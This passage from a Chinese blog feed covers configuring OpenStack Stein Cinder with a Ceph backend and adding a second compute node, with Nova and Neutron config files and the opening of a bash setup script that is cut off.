class="line">www_authenticate_uri = http://controller:5000</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = default</span><br><span class="line">user_domain_name = default</span><br><span class="line">project_name = service</span><br><span class="line">username = cinder</span><br><span class="line">password = CINDER_PASS</span><br><span class="line">[oslo_concurrency]</span><br><span class="line">lock_path = /var/lib/cinder/tmp</span><br><span class="line">[ceph]</span><br><span class="line">volume_driver = cinder.volume.drivers.rbd.RBDDriver</span><br><span class="line">rbd_pool = volumes</span><br><span class="line">rados_connect_timeout = -1</span><br><span class="line">rbd_user = cinder</span><br><span class="line">rbd_secret_uuid = ed4a34e1-590e-4cce-b35a-286a48d7b040</span><br><span class="line">volume_backend_name = ceph</span><br><span class="line">rbd_ceph_conf = /etc/ceph/ceph.conf</span><br></pre></td></tr></table></figure><p>和普通官网不一样的就是我这里没配lvm直接配的ceph,要注意的是<code>my_ip</code>、<code>rbd_secret_uuid</code>、<code>volume_backend_name</code>参数，需要根据自己情况去写。启动服务相关命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> openstack-cinder-volume.service target.service</span><br><span class="line">systemctl start openstack-cinder-volume.service target.service</span><br><span class="line">systemctl restart openstack-cinder-volume.service</span><br></pre></td></tr></table></figure><p>这里在仪表中创建一个卷类型，使用<code>volume_backend_name = ceph</code>来设置元数据<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250111152532.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250111152605.png"><br>尝试创建卷试试<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250111152717.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250111153536.png"><br>成功创建，去ceph中查看<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250111154039.png"><br>在cinder的控制主机中查看<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250111162947.png"></p>]]></content>
    
    
    <summary type="html">前言
参考文档：https://docs.openstack.org/cinder/stein/install/
块存储通过cinder组件对接，他也分为控制节点和计算节点的区分。

控制节点
参考文档： https://docs.openstack.org/cinder/stein/install/cinder-controller-install-rdo.html
先去创库授权，在控制节点执行下面命令

1
2
3
4
5
6


mysql -u root -p
CREATE DATABASE cinder;
GRANT ALL PRIVILEGES ON cinder.* TO &#39;ci</summary>
    
    
    
    <category term="虚拟化平台" scheme="https://blog.boychai.xyz/categories/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B9%B3%E5%8F%B0/"/>
    
    
    <category term="开源工具" scheme="https://blog.boychai.xyz/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/"/>
    
    <category term="OpenStack" scheme="https://blog.boychai.xyz/tags/OpenStack/"/>
    
    <category term="Stein" scheme="https://blog.boychai.xyz/tags/Stein/"/>
    
    <category term="Cinder" scheme="https://blog.boychai.xyz/tags/Cinder/"/>
    
    <category term="LVM" scheme="https://blog.boychai.xyz/tags/LVM/"/>
    
    <category term="NFS" scheme="https://blog.boychai.xyz/tags/NFS/"/>
    
    <category term="CEPH" scheme="https://blog.boychai.xyz/tags/CEPH/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack-增加计算节点(附shell脚本)</title>
    <link href="https://blog.boychai.xyz/2025/01/05/OpenStack-%E5%A2%9E%E5%8A%A0%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9(%E9%99%84shell%E8%84%9A%E6%9C%AC)/"/>
    <id>https://blog.boychai.xyz/2025/01/05/OpenStack-%E5%A2%9E%E5%8A%A0%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9(%E9%99%84shell%E8%84%9A%E6%9C%AC)/</id>
    <published>2025-01-05T16:05:00.000Z</published>
    <updated>2025-07-17T05:40:18.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>官方默认搭建的文档是1控制1计算，实际1个计算节点肯定是不行的，这篇文章将基于openstack集群进行增加计算节点，如果是已经正确的搭建过一次1控制1计算的openstack则本文实操起来应该并不难，因为需要安装的组件就两个，下面开始。(S版本)</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>环境是一台CentOS7.9的机器，然后selinux和firewalld都是关闭的，因为条件有限配置是1H1G的配置。</p><h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><p>主机名为compute2。修改网络内全部的hosts文件，如果有dns则更好</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@compute2 ~]# <span class="built_in">cat</span> /etc/hosts                                                 </span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4    </span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6                 </span><br><span class="line"><span class="comment"># controller</span></span><br><span class="line">10.0.0.11       controller</span><br><span class="line"></span><br><span class="line"><span class="comment"># compute1              </span></span><br><span class="line">10.0.0.31       compute1</span><br><span class="line">10.0.0.32       compute2</span><br></pre></td></tr></table></figure><h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><p>执行下面命令设置时区以及安装chrony</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@compute2 ~]# timedatectl set-timezone Asia/Shanghai</span><br><span class="line">[root@compute2 ~]# yum -y install chrony</span><br></pre></td></tr></table></figure><p>参考下面配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@compute2 ~]# <span class="built_in">cat</span> /etc/chrony.conf |egrep -v <span class="string">&quot;^#|^$&quot;</span></span><br><span class="line">server controller iburst                                                           </span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line">makestep 1.0 3</span><br><span class="line">rtcsync</span><br><span class="line">logdir /var/log/chrony</span><br><span class="line">[root@compute2 ~]# </span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@compute2 ~]# systemctl restart chronyd</span><br></pre></td></tr></table></figure><p>执行命令<code>chronyc sources</code>查看<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105135136.png"></p><h2 id="基础软件包"><a href="#基础软件包" class="headerlink" title="基础软件包"></a>基础软件包</h2><p>我这里是安装s版本的openstack，参考文档地址： <a href="https://docs.openstack.org/install-guide/environment-packages-rdo.html">https://docs.openstack.org/install-guide/environment-packages-rdo.html</a><br>所有主机都执行下面命令,用来安装openstack对应的yum仓库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y centos-release-openstack-stein</span><br></pre></td></tr></table></figure><p>在24年12月28日，他自己的这些源有一部分是不可以用的,通过下面命令进行替换阿里的镜像站</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d</span><br><span class="line">sed -i <span class="string">&#x27;s/mirrorlist=/#mirrorlist=/g&#x27;</span> *.repo</span><br><span class="line">sed -i <span class="string">&#x27;s/#baseurl=/baseurl=/g&#x27;</span> *.repo</span><br><span class="line">sed -i <span class="string">&#x27;s/mirror.centos.org/mirrors.aliyun.com/g&#x27;</span> *.repo</span><br></pre></td></tr></table></figure><p>安装openstack的客户端管理工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install python-openstackclient -y </span><br></pre></td></tr></table></figure><h1 id="组件安装"><a href="#组件安装" class="headerlink" title="组件安装"></a>组件安装</h1><h2 id="Nova-计算组件"><a href="#Nova-计算组件" class="headerlink" title="Nova - 计算组件"></a>Nova - 计算组件</h2><p>下面的操作是在计算节点中操作，文档参考： <a href="https://docs.openstack.org/nova/stein/install/compute-install-rdo.html">https://docs.openstack.org/nova/stein/install/compute-install-rdo.html</a><br>下面开始安装组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-nova-compute</span><br></pre></td></tr></table></figure><p>下面开始修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/nova/nova.conf&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/nova/nova.conf.bak &gt; /etc/nova/nova.conf</span><br></pre></td></tr></table></figure><p>编辑配置<code>/etc/nova/nova.conf</code>，主要修改下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">use_neutron = true</span><br><span class="line">firewall_driver = nova.virt.firewall.NoopFirewallDriver</span><br><span class="line">my_ip = 10.0.0.32</span><br><span class="line">enabled_apis = osapi_compute,metadata</span><br><span class="line">transport_url = rabbit://openstack:RABBIT_PASS@controller</span><br><span class="line">[api]</span><br><span class="line">auth_strategy = keystone</span><br><span class="line">[glance]</span><br><span class="line">api_servers = http://controller:9292</span><br><span class="line">[keystone_authtoken]</span><br><span class="line">auth_url = http://controller:5000/v3</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = Default</span><br><span class="line">user_domain_name = Default</span><br><span class="line">project_name = service</span><br><span class="line">username = nova</span><br><span class="line">password = NOVA_PASS</span><br><span class="line">[oslo_concurrency]</span><br><span class="line">lock_path = /var/lib/nova/tmp</span><br><span class="line">[placement]                                                                        region_name = RegionOne</span><br><span class="line">project_domain_name = Default</span><br><span class="line">project_name = service</span><br><span class="line">auth_type = password</span><br><span class="line">user_domain_name = Default</span><br><span class="line">auth_url = http://controller:5000/v3</span><br><span class="line">username = placement</span><br><span class="line">password = PLACEMENT_PASS</span><br><span class="line">[vnc]                                                                              enabled = true</span><br><span class="line">server_listen = 0.0.0.0</span><br><span class="line">server_proxyclient_address = $my_ip</span><br><span class="line">novncproxy_base_url = http://controller:6080/vnc_auto.html</span><br></pre></td></tr></table></figure><p>要注意的是<code>my_ip</code>这里需要改成自己的ip。<br>启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now libvirtd.service openstack-nova-compute.service</span><br></pre></td></tr></table></figure><p>然后验证参考链接： <a href="https://docs.openstack.org/nova/stein/install/compute-install-rdo.html#add-the-compute-node-to-the-cell-database">https://docs.openstack.org/nova/stein/install/compute-install-rdo.html#add-the-compute-node-to-the-cell-database</a><br>每次加计算节点的时候都需要在控制节点执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/sh -c <span class="string">&quot;nova-manage cell_v2 discover_hosts --verbose&quot;</span> nova</span><br></pre></td></tr></table></figure><p>这是用来发现主机的，如果不想手动去执行，则可以在nova的控制节点配置中添加这段配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[scheduler]</span><br><span class="line">discover_hosts_in_cells_interval = 300</span><br></pre></td></tr></table></figure><h2 id="Neutron-网络组件"><a href="#Neutron-网络组件" class="headerlink" title="Neutron - 网络组件"></a>Neutron - 网络组件</h2><p>参考文档： <a href="https://docs.openstack.org/neutron/stein/install/compute-install-rdo.html">https://docs.openstack.org/neutron/stein/install/compute-install-rdo.html</a><br>安装组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y openstack-neutron-linuxbridge ebtables ipset</span><br></pre></td></tr></table></figure><p>备份配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">cp</span> /etc/neutron/neutron.conf&#123;,.bak&#125;</span><br><span class="line"><span class="built_in">cp</span> /etc/neutron/plugins/ml2/linuxbridge_agent.ini&#123;,.bak&#125;</span><br><span class="line"><span class="comment"># 去除空行和注释</span></span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/neutron.conf.bak &gt; /etc/neutron/neutron.conf</span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/neutron/plugins/ml2/linuxbridge_agent.ini.bak &gt; /etc/neutron/plugins/ml2/linuxbridge_agent.ini</span><br></pre></td></tr></table></figure><p>编辑配置<code>/etc/neutron/neutron.conf</code>主要修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]                                                                          transport_url = rabbit://openstack:RABBIT_PASS@controller                          auth_strategy = keystone</span><br><span class="line">[keystone_authtoken]                                                               www_authenticate_uri = http://controller:5000</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = default</span><br><span class="line">user_domain_name = default</span><br><span class="line">project_name = service</span><br><span class="line">username = neutron</span><br><span class="line">password = NEUTRON_PASS</span><br><span class="line">[oslo_concurrency]              </span><br><span class="line">lock_path = /var/lib/neutron/tmp</span><br></pre></td></tr></table></figure><p>下面配置<code>ml2</code>模块，编辑<code>/etc/neutron/plugins/ml2/linuxbridge_agent.ini</code>，主要内容和控制节点的一样，直接复制也行，主要内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[linux_bridge]                                                                </span><br><span class="line">physical_interface_mappings = provider:ens33                </span><br><span class="line">[vxlan]                                                                       </span><br><span class="line">enable_vxlan = false                                                          </span><br><span class="line">[securitygroup]                                                               </span><br><span class="line">enable_security_group = true                                                  </span><br><span class="line">firewall_driver = neutron.agent.linux.iptables_firewall.IptablesFirewallDriver</span><br></pre></td></tr></table></figure><p>下面开始加载系统模块，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;br_netfilter&quot;</span> &gt;&gt; /etc/modules-load.d/bridge.conf</span><br><span class="line">modprobe br_netfilter</span><br></pre></td></tr></table></figure><p>配置sysctl,编辑<code>/etc/sysctl.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.bridge.bridge-nf-call-iptables = 1 </span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br></pre></td></tr></table></figure><p>执行<code>sysctl -p</code>重载<br>下面在计算节点的计算模块对接一下,编辑<code>/etc/nova/nova.conf</code>,主要修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[neutron]</span><br><span class="line">url = http://controller:9696</span><br><span class="line">auth_url = http://controller:5000</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = default</span><br><span class="line">user_domain_name = default</span><br><span class="line">region_name = RegionOne</span><br><span class="line">project_name = service</span><br><span class="line">username = neutron</span><br><span class="line">password = NEUTRON_PASS</span><br></pre></td></tr></table></figure><p>重启计算节点的<code>nova</code>服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart openstack-nova-compute.service</span><br></pre></td></tr></table></figure><p>启动计算节点的<code>neutron</code>模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now neutron-linuxbridge-agent.service</span><br></pre></td></tr></table></figure><h1 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h1><p>因为系统是centos7.9默认虚机模拟硬件是rhel7.6，这个是用不了的，实例开机会出现<code>Booting from Hard Disk...</code>的问题，要解决这个问题可以参考<a href="https://blog.boychai.xyz/index.php/archives/83/">这篇文章的问题解决</a>，这里直接做修改<br>修改nova计算节点的配置文件<code>/etc/nova/nova.conf</code>，修改内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># libvirt 段增加</span><br><span class="line">[libvirt]</span><br><span class="line">hw_machine_type=x86_64=pc-i440fx-rhel7.2.0</span><br></pre></td></tr></table></figure><p>修改之后重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart libvirtd openstack-nova-compute</span><br></pre></td></tr></table></figure><h1 id="成果验证"><a href="#成果验证" class="headerlink" title="成果验证"></a>成果验证</h1><p>此时去仪表盘中查看计算节点的主机列表<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105144957.png"><br>确保实例是运行在第二台机器上的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250105145004.png"></p><h1 id="编写自动脚本"><a href="#编写自动脚本" class="headerlink" title="编写自动脚本"></a>编写自动脚本</h1><p>增加计算节点的操作并不多，这里可以直接编写自动脚本实现加节点的操作，脚本如下<br>要注意的是，这个脚本是基于我当前环境做的，自己用请根据实际情况来编写，我这个只能作为一个参考，编写脚本的时候一开始我认为应该多写一些判断和信息输出，写了一会发现对于我当前的环境写这么多判断和输出意义不大，所以后面就没怎么加了，所以我这个只能作为参考不建议直接拿来用，请根据自己的情况来编写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 判断比较简单，只提供参考，不建议直接用，请根据实际情况修改</span></span><br><span class="line">hostname=<span class="string">&quot;compute3&quot;</span></span><br><span class="line">eth_name=<span class="string">&quot;ens33&quot;</span></span><br><span class="line">ip=`ip -4 addr show <span class="variable">$eth_name</span> | grep inet | awk <span class="string">&#x27;&#123; print $2 &#125;&#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;/&#x27;</span> -f1`</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">set_chrony</span></span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> ! rpm -q chrony &gt; /dev/null 2&gt;&amp;1; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[INSTALL]安装chrony中...&quot;</span></span><br><span class="line">        yum -y install chrony &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">        <span class="keyword">if</span> ! rpm -q chrony &gt; /dev/null 2&gt;&amp;1; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[ERROR]: Chrony安装失败&quot;</span></span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;[INSTALL] Chrony 安装成功&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;[INSTALL] Chrony 已经安装&quot;</span></span><br><span class="line">    <span class="keyword">fi</span>    </span><br><span class="line">    <span class="built_in">cp</span> /etc/chrony.conf&#123;,.bak&#125;</span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /etc/chrony.conf</span></span><br><span class="line"><span class="string">server controller iburst                                                           </span></span><br><span class="line"><span class="string">driftfile /var/lib/chrony/drift</span></span><br><span class="line"><span class="string">makestep 1.0 3</span></span><br><span class="line"><span class="string">rtcsync</span></span><br><span class="line"><span class="string">logdir /var/log/chrony</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">    systemctl <span class="built_in">enable</span> chronyd</span><br><span class="line">    systemctl restart chronyd</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">install_base_package</span></span>()&#123;</span><br><span class="line">    yum install -y centos-release-openstack-stein &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="built_in">cd</span> /etc/yum.repos.d</span><br><span class="line">    sed -i <span class="string">&#x27;s/mirrorlist=/#mirrorlist=/g&#x27;</span> *.repo</span><br><span class="line">    sed -i <span class="string">&#x27;s/#baseurl=/baseurl=/g&#x27;</span> *.repo</span><br><span class="line">    sed -i <span class="string">&#x27;s/mirror.centos.org/mirrors.aliyun.com/g&#x27;</span> *.repo</span><br><span class="line">    yum install python-openstackclient -y  &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">install_nova</span></span>() &#123;</span><br><span class="line">yum install -y openstack-nova-compute &gt; /dev/null 2&gt;&amp;1</span><br><span class="line"><span class="built_in">cp</span> /etc/nova/nova.conf&#123;,.bak&#125;</span><br><span class="line">egrep -v <span class="string">&quot;^$|^#&quot;</span> /etc/nova/nova.conf.bak &gt; /etc/nova/nova.conf</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /etc/nova/nova.conf</span></span><br><span class="line"><span class="string">[DEFAULT]</span></span><br><span class="line"><span class="string">use_neutron = true</span></span><br><span class="line"><span class="string">firewall_driver = nova.virt.firewall.NoopFirewallDriver</span></span><br><span class="line"><span class="string">my_ip = $ip</span></span><br><span class="line"><span class="string">enabled_apis = osapi_compute,metadata</span></span><br><span class="line"><span class="string">transport_url = rabbit://openstack:RABBIT_PASS@controller</span></span><br><span class="line"><span class="string">[api]</span></span><br><span class="line"><span class="string">auth_strategy = keystone</span></span><br><span class="line"><span class="string">[api_database]</span></span><br><span class="line"><span class="string">[barbican]</span></span><br><span class="line"><span class="string">[cache]</span></span><br><span class="line"><span class="string">[cells]</span></span><br><span class="line"><span class="string">[cinder]</span></span><br><span class="line"><span class="string">[compute]</span></span><br><span class="line"><span class="string">[conductor]</span></span><br><span class="line"><span class="string">[console]</span></span><br><span class="line"><span class="string">[consoleauth]</span></span><br><span class="line"><span class="string">[cors]</span></span><br><span class="line"><span class="string">[database]</span></span><br><span class="line"><span class="string">[devices]</span></span><br><span class="line"><span class="string">[ephemeral_storage_encryption]</span></span><br><span class="line"><span class="string">[filter_scheduler]</span></span><br><span class="line"><span class="string">[glance]</span></span><br><span class="line"><span class="string">api_servers = http://controller:9292</span></span><br><span class="line"><span class="string">[guestfs]</span></span><br><span class="line"><span class="string">[healthcheck]</span></span><br><span class="line"><span class="string">[hyperv]</span></span><br><span class="line"><span class="string">[ironic]</span></span><br><span class="line"><span class="string">[key_manager]</span></span><br><span class="line"><span class="string">[keystone]</span></span><br><span class="line"><span class="string">[keystone_authtoken]</span></span><br><span class="line"><span class="string">auth_url = http://controller:5000/v3</span></span><br><span 